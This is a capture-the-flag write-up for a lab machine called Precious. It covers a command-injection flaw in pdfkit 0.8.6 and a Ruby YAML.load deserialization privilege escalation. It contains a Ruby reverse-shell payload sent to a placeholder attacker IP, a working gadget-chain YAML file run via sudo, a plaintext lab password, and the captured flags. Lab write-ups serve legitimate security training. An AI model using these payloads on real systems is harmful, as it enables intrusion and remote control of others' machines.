## Precious Writeup

### Machine IP

``` 
10.10.11.189
```

### nmap scan

```
$ nmap -sC -sV -Pn -T4 10.10.11.189

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 08:30 EST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.04 seconds
```

We can see ssh and http are open. We also have something called Phusion Passenger on port 80.


### precious.htb

The http site takes us to a "Convert Web Page to PDF" tool.

Let's spin up a python web server with:

```
python3 -m http.server
```

Using our local IP to connect to the python server and tring to download the root page of the web server...sure enough, the tool gives us a PDF file with the directory listing.

Trying to convert a file with an inline `<script>` tag gives us nothing. Seems as though there is some kind of input sanitization.


### pdf file analysis

Analysing the output pdf file from earlier with `exiftool`:

```
$ exiftool out.pdf
ExifTool Version Number         : 12.52
File Name                       : out.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2023:01:26 08:49:11-05:00
File Access Date/Time           : 2023:01:26 08:49:21-05:00
File Inode Change Date/Time     : 2023:01:26 10:07:43-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Interesting... the creator is 'pdfkit v0.8.6'. Let's scour the web for any exploits for this version of pdfkit!


### pdfkit exploit

[This link](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) gives us information about a command injection exploit via ruby, demonstrated by the following example code:

```
PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").to_pdf 
# 5 seconds wait... 
```

Let's try this out...sure enough, the page seems to hang for around 5 seconds on submitting the web page!

Time to head to revshells...

 
### Reverse Shell Injection

We read that this exploit was a ruby based exploit. So we spin up a `nc` listener:

```
nc -lnvp 4444
```

and insert a ruby based revshell into our URL like so...

```
http://<LOCALIP>:<LOCALPORT>/?name=%20  {`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<LOCALIP>",<NCLISTENERPORT>))'`}
```

Clicking submit, we get reverse shell access!


### Directory searching

We find a few files relating to the pdf converter.

Navigating to `/home`, we find there are two users:
1. `ruby` (current user)
2. `henry`

In `henry`'s home directory, we find the `user.txt` flag. cat, head and less don't work on this file do to restrictions. 

Luckily, if we do a quick `whoami`, we find that the current user is `ruby`.
After a bit of searching, we find the file `config` in the `/home/ruby/.bundle` folder. Catting out this file...

```
$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

We find henry's password! Time to ssh!


### SSH (henry)

Using the password we found for user `henry` from before:

```
$ ssh  henry@10.10.11.189             
henry@10.10.11.189's password: *************
```

Boom! We're in!
Now we can cat the user password!

```
$ cat user.txt
b47ea5d5a17c22a8975f45d7386b1f37
```


### Enumeration

Checking what we can run as sudo:

```
$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So, we can run `/opt/update_dependencies.rb` as root. Let's cat the file...

```
$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

[Hacktricks tells us](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) that we can perform a deserialization attack via `YAML.load()` in ruby.

We need to craft a `dependencies.yml` file that will exploit the vulnerability in `YAML.load()`.


### Crafting the exploit

On our local machine, I create a file:

```
$ touch dependencies.yml
```

From the link above ([also here](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)), let's try and run an exploit.

Pasting an exploit from the website, into `dependencies.yml`...

```
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: whoami
          method_id: :resolve 
```

Setting `git_set` as `whoami`, when run, it should show us `root` (as we are using sudo for our command.

Transferring to our good old friend `henry` at `10.10.11.189`:

```
$ scp dependencies.yml henry@10.10.11.189:~/dependencies.yml
henry@10.10.11.189's password: 
dependencies.yml                                      100%  627     3.0KB/s   00:00  
```

Back to the ssh session...catting the contents of `dependencies.yml` on the remote machine, we see the transfer was successful.

Running the command from earlier as sudo:

```
$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

Awesome, it showed us we are `root` right at the start! Our Remote Code Execution (RCE) exploit worked! Let's get the flag.


### Grabbing that sweet root flag

We can probably assume the flag is called something along the lines of `flag.txt` or `root.txt`, but to be sure, let's get the `update_dependencies.rb` file to show us the contents of the `root` folder.

Changing the `git_set` variable to `"ls -la /root"` and uploading and running, we get the following results...

```
$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
total 28
drwx------  4 root root 4096 Nov 21 15:32 .
drwxr-xr-x 18 root root 4096 Nov 21 15:11 ..
lrwxrwxrwx  1 root root    9 Sep 26 05:04 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 26 08:28 .bundle
drwxr-xr-x  3 root root 4096 Nov 21 15:13 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Feb  2 02:29 root.txt
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
...
...
```

Nice, the file is called `root.txt` as we suspected. One again crafting the `dependencies.yml` file to say `git_set: "cat /root/root.txt"`, uploading and running, we get...

```
$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
f364ee72c9a3c1733e161d83ae923159
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
...
...
```

We got the root flag! Next time you use ruby, don't use the `YAML.load()` function, instead go for `YAML.safe_load()`, which remove this RCE attack vector! ;)

